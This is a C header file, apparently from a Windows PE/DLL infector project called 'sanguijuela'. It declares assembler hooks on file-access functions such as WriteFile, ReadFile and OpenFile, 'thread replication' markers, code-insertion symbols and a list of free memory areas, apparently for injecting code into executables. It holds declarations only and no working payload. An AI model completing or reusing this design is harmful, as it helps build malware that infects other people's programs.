#include <windows.h>
#include <winbase.h>
#include <tlhelp32.h>
#include <stdio.h>

#ifndef _SANGUIJUELA_COMMON_H
#define _SANGUIJUELA_COMMON_H

// Preprocesor
#define RVA(BASE, addr)	(BASE + addr)

#define USER32	"user32.dll"
#define KERNEL	"kernel32.dll"

#define LoadLib	"LoadLibraryA"
#define FreeLib "FreeLibrary"

#define DLL_METHOD 0
#define PE_METHOD 1
#define DO_EXIT 1
#define PAD	4

#define PATCH_EXP 0 // no parcheamos IMAGE_EXPORT_DIRECTORY

#define MAX_FUNC 128
#define MAX_FILE 256

#define MIN_SIZE 1024
#define MAX_SIZE 4096

// assembler functions
extern void th_context();

extern void kWriteFile();
extern void kWriteFileEx();
extern void kOpenFile();
extern void kGetFileAttributesW();
extern void kReadFile();


// asm positions for thread replication
extern const BYTE th_attach;
extern const BYTE h_module;

extern const BYTE call_indirect;
extern const BYTE call_direct;

extern const BYTE open_indirect;
extern const BYTE open_direct;

extern const BYTE close_indirect;
extern const BYTE close_direct;

// source insertion
extern const char *act_name;
extern const BYTE msg_box;

// utils structs
typedef struct _ExpList {
	DWORD address;
	char name[MAX_FILE];
	char ondll[MAX_FILE];
} ExpList;

typedef struct _FreeMem {
	DWORD mem_addr;
	DWORD mem_len;
} FreeMem;

typedef struct _FreeMem_list {
	FreeMem item;
	struct _FreeMem_list *next;
} FreeMem_l;

// las globales
//extern ExpList *StaticList;
extern FreeMem_l *head_ptr;
extern FreeMem_l *tail_ptr;
extern FreeMem_l **fMem;
extern int section;

#endif // _SANGUIJUELA_COMMON_H
